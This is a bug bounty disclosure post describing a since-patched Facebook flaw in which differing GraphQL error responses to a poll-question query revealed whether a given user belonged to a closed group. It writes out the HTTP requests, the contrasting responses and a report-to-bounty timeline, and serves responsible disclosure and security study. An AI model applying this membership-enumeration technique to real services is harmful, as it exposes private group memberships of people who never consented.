---
title:  "Disclose members in any Groups."
date:   2019-11-24 12:24:15 +0800
categories: Hacking
classes:
  - landing
header:
  teaser: /assets/img/Facebook.jpg
---

I found that any non-member could disclose members in any closed Facebook group.

## POC / Reprosteps

User A ( In closed group (C) )
User B (non-member)

Poll question.

questionID":"2998452380182679" (Group C) -> user A


```
POST /api/graphql/ HTTP/1.1
Host: www.facebook.com

variables={"actorID":"USER A","first":5,"questionID":"2998452380182679"}&doc_id=2507703069268152

```
Response

```
"severity": "CRITICAL",
         "code": 1675030,
         "api_error_code": -1,
         "summary": "Query error",
         "description": "Error performing query.",
         "is_silent": false,
         "is_transient": false,
         "requires_reauth": false,
```

Now repeat step 1 replace member ->  non-members

```
POST /api/graphql/ HTTP/1.1
Host: www.facebook.com

variables={"actorID":"USER B","first":5,"questionID":"2998452380182679"}&doc_id=2507703069268152

```
Response

As opposed to a user who does not have a member 

``` 

"api_error_code": 200,
"summary": "Insufficient Permission",
"description": "You do not have the necessary permission for the specified Page to perform the requested action.",
"is_silent": false,

```
Replace a member in the group 
USER C ( in closed group )

```
POST /api/graphql/ HTTP/1.1
Host: www.facebook.com

variables={"actorID":"USER C","first":5,"questionID":"2998452380182679"}&doc_id=2507703069268152

```
Response


```

"severity": "CRITICAL",
         "code": 1675030,
         "api_error_code": -1,
         "summary": "Query error",
         "description": "Error performing query.",
         "is_silent": false,
         "is_transient": false,
         "requires_reauth": false,

```
member is known based on the difference in responses as well as being explicitly stated in the error message.

## Impact

This could potentially let an attacker infer whether a user has a member on a specific group.

## Timeline

13/09/2019: Report Sent

15/09/2019: Confirmation of reproduce by Facebook

19/09/2019: Further Investigation By Facebook

21/09/2019: Patched By Facebook

21/09/2019: Confirmation of patch by Facebook

03/11/2019: $3000 bounty awarded by Facebook


